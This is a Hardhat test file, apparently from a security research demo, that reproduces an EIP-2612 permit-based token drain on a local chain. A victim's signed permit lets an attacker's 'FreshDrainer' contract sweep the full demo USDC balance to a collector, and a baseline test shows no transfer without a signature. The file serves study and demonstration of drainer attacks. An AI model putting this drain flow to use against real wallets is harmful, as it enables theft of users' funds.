const { expect } = require("chai");
const { ethers } = require("hardhat");

// Plays the whole "Hold up" counterfactual on the local chain:
// victim signs an EIP-2612 permit off-chain, the attacker's FreshDrainer calls
// permit()+transferFrom() in one transaction. This mirrors exactly what
// research/demo_reelle/chain/drain.mjs does against a running node.
describe("Counterfactual: permit-based drain", function () {
  let usdc, drainer;
  let collector, victim, attacker;
  const VICTIM_USDC = ethers.parseUnits("2480", 6);

  beforeEach(async function () {
    [collector, victim, attacker] = await ethers.getSigners();

    const DemoUSDC = await ethers.getContractFactory("DemoUSDC");
    usdc = await DemoUSDC.deploy();
    await usdc.waitForDeployment();

    const FreshDrainer = await ethers.getContractFactory("FreshDrainer");
    drainer = await FreshDrainer.deploy(collector.address);
    await drainer.waitForDeployment();

    await usdc.mint(victim.address, VICTIM_USDC);
  });

  async function signPermit(signer, spender, value) {
    const nonce = await usdc.nonces(victim.address);
    const deadline = Math.floor(Date.now() / 1000) + 3600;
    const domain = {
      name: "Demo USDC",
      version: "1",
      chainId: (await ethers.provider.getNetwork()).chainId,
      verifyingContract: await usdc.getAddress(),
    };
    const types = {
      Permit: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };
    const message = { owner: victim.address, spender, value, nonce, deadline };
    const signature = await signer.signTypedData(domain, types, message);
    const sig = ethers.Signature.from(signature);
    return { v: sig.v, r: sig.r, s: sig.s, deadline };
  }

  it("drains the victim's full balance once a valid permit signature exists", async function () {
    const drainerAddr = await drainer.getAddress();
    const { v, r, s, deadline } = await signPermit(victim, drainerAddr, VICTIM_USDC);

    expect(await usdc.balanceOf(victim.address)).to.equal(VICTIM_USDC);
    expect(await usdc.balanceOf(collector.address)).to.equal(0n);

    await expect(
      drainer
        .connect(attacker)
        .drainWithPermit(await usdc.getAddress(), victim.address, VICTIM_USDC, deadline, v, r, s)
    )
      .to.emit(drainer, "DrainedERC20")
      .withArgs(victim.address, await usdc.getAddress(), VICTIM_USDC);

    expect(await usdc.balanceOf(victim.address)).to.equal(0n);
    expect(await usdc.balanceOf(collector.address)).to.equal(VICTIM_USDC);
  });

  it("moves nothing when the victim never signed anything (counterfactual baseline)", async function () {
    const before = await usdc.balanceOf(victim.address);
    expect(before).to.equal(VICTIM_USDC);

    // No permit was ever produced: the attacker has no v/r/s to call drainWithPermit with,
    // and sweepERC20 (the approve-based path) requires a prior allowance that doesn't exist.
    await expect(
      drainer.connect(attacker).sweepERC20(await usdc.getAddress(), victim.address)
    ).to.be.revertedWith("No allowance or balance");

    expect(await usdc.balanceOf(victim.address)).to.equal(before);
    expect(await usdc.balanceOf(collector.address)).to.equal(0n);
  });
});
